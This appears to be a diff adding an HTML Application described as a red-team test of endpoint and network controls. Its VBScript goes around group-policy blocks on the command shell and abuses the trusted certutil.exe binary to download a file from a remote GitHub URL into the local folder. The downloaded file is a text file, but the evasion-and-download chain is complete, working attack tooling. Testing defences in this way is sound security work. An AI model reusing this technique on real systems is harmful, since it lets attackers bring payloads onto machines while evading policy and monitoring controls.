@@ -1,0 +1,332 @@
+<!--
+  HTML Application (HTA) for Certutil.exe Remote File Download Test
+  This HTA demonstrates chaining bypasses:
+  1. Uses HTA to bypass GPO restrictions on CMD/PS.
+  2. Executes certutil.exe (a legitimate binary) to download a file from a remote URL.
+
+  This is a 'Test 8' scenario to validate EDR/network controls
+  against multi-stage attacks and the abuse of trusted binaries for file transfer,
+  bypassing browser-based security. We are specifically testing if a benign
+  '.txt' file download is flagged, as opposed to an '.exe'.
+-->
+<html>
+<head>
+    <title>Red Team HTA: Certutil Remote Download Test (Text File)</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="RedTeamCertutilRemoteTest"
+        SYSMENU="yes"
+        MINIMIZEBUTTON="yes"
+        MAXIMIZEBUTTON="yes"
+        BORDER="thick"
+        BORDERSTYLE="normal"
+        CAPTION="yes"
+        ICON="shell32.dll#4"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+    />
+    <style>
+        /* Basic styling for a cleaner look */
+        body {
+            font-family: 'Inter', sans-serif; /* Using Inter font */
+            background-color: #f0f4f8; /* Light background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px; /* Rounded corners */
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+        p {
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        button {
+            background-color: #4CAF50; /* Green button */
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px; /* Rounded corners for button */
+            cursor: pointer;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3);
+        }
+        button:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 5px rgba(76, 175, 80, 0.3);
+        }
+        #statusMessage {
+            margin-top: 20px;
+            color: #333;
+            font-weight: bold;
+        }
+    </style>
+    <script language="VBScript">
+        ' ==========================================
+        ' VBScript to launch Certutil.exe to download a remote file
+        ' ==========================================
+
+        ' Global variables
+        Dim WshShell, fso, scriptPath, scriptDir, outputFile
+        Dim statusElement ' Global variable to hold the reference to the status message element
+
+        ' Function to initialize COM objects and paths
+        Sub InitializeHTA()
+            On Error Resume Next ' Enable error handling for this sub
+
+            ' Get reference to the status message element first
+            Set statusElement = document.getElementById("statusMessage")
+            If statusElement Is Nothing Then
+                Exit Sub ' Cannot update UI if element is not found
+            End If
+            statusElement.innerText = "Initializing HTA for Certutil.exe Test..."
+
+            Set WshShell = CreateObject("WScript.Shell")
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error initializing WScript.Shell: " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error initializing FileSystemObject: " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+            On Error GoTo 0 ' Disable error handling
+
+            Dim htaUrl, tempPath
+            htaUrl = document.URL
+            
+            ' Robustly remove "file:///" or "file://" prefix and decode URL-encoded characters
+            If Left(htaUrl, 8) = "file:///" Then
+                tempPath = Mid(htaUrl, 9) ' Remove "file:///"
+            ElseIf Left(htaUrl, 7) = "file://" Then
+                tempPath = Mid(htaUrl, 8) ' Remove "file://"
+            Else
+                tempPath = htaUrl ' Fallback, though unlikely for local HTA
+            End If
+            
+            ' Decode common URL-encoded characters, especially spaces (%20)
+            scriptPath = Replace(tempPath, "%20", " ")
+            ' Convert forward slashes to backslashes for Windows paths
+            scriptPath = Replace(scriptPath, "/", "\")
+
+            ' Get the parent directory of the HTA file
+            On Error Resume Next ' Enable error handling for FSO operations
+            scriptDir = fso.GetParentFolderName(scriptPath)
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error getting parent folder name for '" & scriptPath & "': " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+            On Error GoTo 0 ' Disable error handling
+
+            ' Output file for this HTA's execution results
+            outputFile = scriptDir & "\hta_certutil_output.txt"
+
+            statusElement.innerText = "HTA Initialized. Ready to run Certutil.exe remote download test."
+        End Sub
+
+        ' Subroutine to execute a command and capture its output
+        Function ExecuteCommandAndCaptureOutput(cmd)
+            Dim oExec, strOutput, strError
+            
+            If Not statusElement Is Nothing Then statusElement.innerText = "Executing command: " & cmd
+
+            On Error Resume Next ' Enable error handling for WshShell.Exec
+            Set oExec = WshShell.Exec(cmd) ' Execute the full command string
+            If Err.Number <> 0 Then
+                ExecuteCommandAndCaptureOutput = "ERROR: Failed to execute command '" & cmd & "': " & Err.Description
+                Err.Clear
+                Exit Function
+            End If
+            On Error GoTo 0 ' Disable error handling
+
+            ' Read the standard output (this implicitly waits for the command to finish)
+            If Not oExec.StdOut.AtEndOfStream Then
+                strOutput = oExec.StdOut.ReadAll
+            Else
+                strOutput = ""
+            End If
+
+            ' Read the standard error
+            If Not oExec.StdErr.AtEndOfStream Then
+                strError = oExec.StdErr.ReadAll
+            Else
+                strError = ""
+            End If
+
+            ' Return combined output (or just standard output if error is empty)
+            If strError <> "" Then
+                ExecuteCommandAndCaptureOutput = "ERROR (Command Output): " & strError & vbCrLf & strOutput
+            Else
+                ExecuteCommandAndCaptureOutput = strOutput
+            End If
+        End Function
+
+        ' Main function to be called when the button is clicked to run Certutil.exe
+        Sub ExecuteCertutilTest()
+            Dim objFile, strCertutilOutput
+            Dim certutilPath, downloadSource, downloadDestination, fullCommand
+
+            ' Ensure InitializeHTA has run and statusElement is valid
+            If statusElement Is Nothing Then
+                InitializeHTA
+                If statusElement Is Nothing Then Exit Sub
+            End If
+            If InStr(statusElement.innerText, "Error") > 0 Then Exit Sub
+
+            statusElement.innerText = "Starting Certutil.exe file download test via HTA..."
+
+            ' --- TEST SETUP: Downloading a benign, public file from a remote URL ---
+            ' The URL points to a public text file
+            downloadSource = "https://raw.githubusercontent.com/john5652/redteam/refs/heads/main/slack-enum-notes.txt"
+            
+            ' Define the path to certutil.exe
+            certutilPath = "C:\Windows\System32\certutil.exe"
+
+            ' Define the destination file path. File will be saved in the same directory as this HTA
+            downloadDestination = scriptDir & "\certutil_downloaded_notes.txt"
+
+            ' Construct the full command to execute
+            ' certutil.exe -urlcache -f [URL] [destination]
+            ' The -f flag forces an overwrite of the destination file
+            fullCommand = """" & certutilPath & """ -urlcache -f """ & downloadSource & """ """ & downloadDestination & """"
+
+            On Error Resume Next ' Enable error handling for file operations
+
+            ' Delete the HTA's output file if it already exists
+            If fso.FileExists(outputFile) Then
+                statusElement.innerText = "Deleting old HTA output file..."
+                fso.DeleteFile(outputFile)
+                If Err.Number <> 0 Then
+                    statusElement.innerText = "Error deleting old HTA output file: " & Err.Description
+                    Err.Clear
+                    Exit Sub
+                End If
+            End If
+            
+            ' Delete the downloaded file if it already exists
+            If fso.FileExists(downloadDestination) Then
+                statusElement.innerText = "Deleting old downloaded file..."
+                fso.DeleteFile(downloadDestination)
+                If Err.Number <> 0 Then
+                    statusElement.innerText = "Error deleting old downloaded file: " & Err.Description
+                    Err.Clear
+                    Exit Sub
+                End If
+            End If
+
+
+            ' Create the HTA's output file and write header
+            statusElement.innerText = "Creating HTA output file and writing header..."
+            Set objFile = fso.CreateTextFile(outputFile, True) ' True to overwrite if exists
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error creating HTA output file: " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+            objFile.WriteLine "==== HTA LAUNCHING CERTUTIL.EXE TEST BEGIN ===="
+            objFile.WriteLine "Command to be executed: " & fullCommand
+            objFile.Close
+            Set objFile = Nothing
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error writing HTA header: " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+
+            On Error GoTo 0 ' Disable error handling for now
+
+            ' Execute Certutil.exe and capture its output
+            statusElement.innerText = "Executing Certutil.exe via HTA..."
+            strCertutilOutput = ExecuteCommandAndCaptureOutput(fullCommand)
+            
+            ' Check if ExecuteCommandAndCaptureOutput returned an error string
+            If Left(strCertutilOutput, 6) = "ERROR:" Then
+                statusElement.innerText = strCertutilOutput
+                Exit Sub
+            End If
+
+            On Error Resume Next ' Re-enable error handling for file operations
+
+            ' Append the captured Certutil.exe output to the HTA's output file
+            statusElement.innerText = "Appending Certutil.exe execution output to HTA file..."
+            Set objFile = fso.OpenTextFile(outputFile, 8, True) ' 8 for Append mode
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error opening HTA output file for append (output): " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+            objFile.WriteLine vbCrLf & "--- Certutil.exe Execution Output ---" & vbCrLf
+            objFile.WriteLine strCertutilOutput
+            objFile.Close
+            Set objFile = Nothing
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error writing Certutil.exe output to HTA file: " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+
+            ' Append the footer to the HTA's output file
+            statusElement.innerText = "Appending footer to HTA output file..."
+            Set objFile = fso.OpenTextFile(outputFile, 8, True) ' 8 for Append mode
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error opening HTA output file for append (footer): " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+            objFile.WriteLine "==== HTA LAUNCHING CERTUTIL.EXE TEST END ===="
+            objFile.Close
+            Set objFile = Nothing
+            If Err.Number <> 0 Then
+                statusElement.innerText = "Error writing HTA footer: " & Err.Description
+                Err.Clear
+                Exit Sub
+            End If
+
+            On Error GoTo 0 ' Disable error handling
+
+            ' Notify the user through the HTA interface
+            statusElement.innerText = "Done! Certutil.exe execution initiated. Check for file: " & downloadDestination
+        End Sub
+
+        ' Call InitializeHTA when the HTA loads using the standard VBScript method
+        Window_Onload = GetRef("InitializeHTA")
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Red Team HTA: Certutil Remote Download Test (Text File)</h1>
+        <p>
+            This HTA will launch <code>certutil.exe</code> to download a file from a remote URL.
+            It will then create a log file (<code>hta_certutil_output.txt</code>) to report any console output from the Certutil process.
+        </p>
+        <button onclick="VBScript:ExecuteCertutilTest()">Run Certutil Test</button>
+        <p id="statusMessage"></p>
+    </div>
+</body>
+</html>
